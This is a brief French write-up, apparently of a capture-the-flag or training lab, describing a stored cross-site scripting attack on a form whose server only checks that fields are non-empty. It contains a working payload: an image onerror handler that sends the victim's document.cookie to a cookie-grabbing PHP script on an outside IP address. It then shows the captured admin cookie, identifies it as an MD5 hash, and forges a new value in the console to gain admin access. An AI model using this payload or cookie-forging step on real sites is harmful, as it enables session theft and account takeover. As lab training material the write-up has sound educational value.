

En inspectant la page on voit que le serveur check juste que les inputs ne soient pas vide
Il nous suffit alors de modifier la longueur des inputs pour pouvoir y placer des scripts Js/Html/Php.
Le second champ n'execute pas le code par contre le premier champ n'est pas protegé on y ajoute donc notre script

<img src="azerty.jpg" onerror="window.location='http://46.101.40.236:3000/get_cookie_xss.php?cookie='+document.cookie;" hidden>

Resultat : http://46.101.40.236:3000/get_cookie_xss.php?cookie=I_am_admin=68934a3e9455fa72420237eb05902327

On check le type de hashage avec https://md5hashing.net/hash_type_checker/ 
On voit que c'est du md5, et que sa valeur est false;

Ensuite on ouvre la console et on set une nouvelle valeur au cookie :  document.cookie="I_am_admin=b326b5062b2f0e69046810717534cb09"
On refresh la page

